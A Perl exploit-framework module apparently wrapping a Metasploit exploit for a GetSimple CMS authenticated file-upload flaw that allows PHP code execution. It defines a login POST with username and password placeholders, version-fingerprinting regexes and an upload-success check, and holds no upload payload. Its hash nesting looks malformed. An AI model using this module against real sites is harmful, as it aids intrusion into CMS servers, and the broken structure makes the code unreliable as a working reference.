package GET::MSF::GetSimpleCmsUploadExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "GetSimpleCmsUploadExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

        This module exploits a file upload vulnerability in GetSimple CMS. By abusing the

        upload.php file, a malicious authenticated user can upload an arbitrary file,

        including PHP code, which results in arbitrary code execution.

      ",
  METHOD      => "GET",
  MSF_MODULE  => "get_simple_cms_upload_exec",
  OSVDB       => 93034,
  PATH        => "path=&",
  PATHS       => ["GetSimpleCMS"],
  PAYLOAD     => "userid=__USERNAME__&pwd=__PASSWORD__&submitted=Login&",
  TITLE       => "GetSimpleCMS PHP File Upload Vulnerability",
  VARIABLES => {
    'PASSWORD' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       {
  DESCRIPTION => "The full URI path to GetSimplecms",
  VALUE => "/GetSimpleCMS",
},
    'USERNAME' =>       { DESCRIPTION => "", VALUE => "" },
  },
      },  VALIDATION => {
    'TREGEX' =>       (
  "GetSimple CMS.*Version\\s*\\([0-9\\.]+\\)",
  "Success! File location.*>.*\\(.*\\)<",
),

  TYPE => 'MSF',
  PLATFORM => 'UNIX',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'admin/index.php',
      PAYLOAD      => 'userid=__USERNAME__&pwd=__PASSWORD__&submitted=Login',
      TEXT   => 'Sending Exploit #1 Request : [POST] /admin/index.php',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
